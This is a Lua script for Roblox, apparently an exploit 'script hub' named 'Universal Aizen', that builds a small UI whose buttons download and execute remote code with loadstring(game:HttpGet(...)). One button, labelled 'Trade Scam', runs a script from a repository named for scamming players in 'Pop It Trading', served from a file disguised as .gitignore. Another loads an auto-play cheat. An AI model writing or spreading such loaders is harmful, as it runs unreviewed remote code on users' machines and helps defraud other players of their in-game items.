-- Load Kavo UI Library
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua", true))()
local Window = Library.CreateLib("Universal Aizen", "Sentinel") -- Updated UI Name

-- Create Tabs and Sections
local MainTab = Window:NewTab("Main")
local MainSection = MainTab:NewSection("Universal Aizen Scripts")

MainSection:NewLabel("Welcome to Universal Aizen!")

-- **Pop It Trading Script**
MainSection:NewButton("Pop It Trading", "Trade Scam", function()
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Cooked-METHods/pop-it-trading-scam-script/main/.gitignore", true))()
    end)
    
    if success then
        print("Pop It Trading script executed!")
    else
        warn("Pop It Trading script failed to load:", err)
    end
end)

-- **Blue Lock Rivals Script**
MainSection:NewButton("Blue Lock Rivals", "Auto play script", function()
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/game/main/TbaoHubBlueLockRivals", true))()
    end)

    if success then
        print("Blue Lock Rivals script executed!")
    else
        warn("Blue Lock Rivals script failed to load:", err)
    end
end)

-- **Make UI Draggable on Mobile & Keyboard Move on PC**
local UserInputService = game:GetService("UserInputService")
if UserInputService.TouchEnabled then
    print("Running on Mobile - UI is draggable by touch!")
else
    print("Running on PC - UI is controlled by keyboard!")
end

-- Auto-draggable UI
Library:ToggleUI() 

print("Universal Aizen Loaded Successfully!")
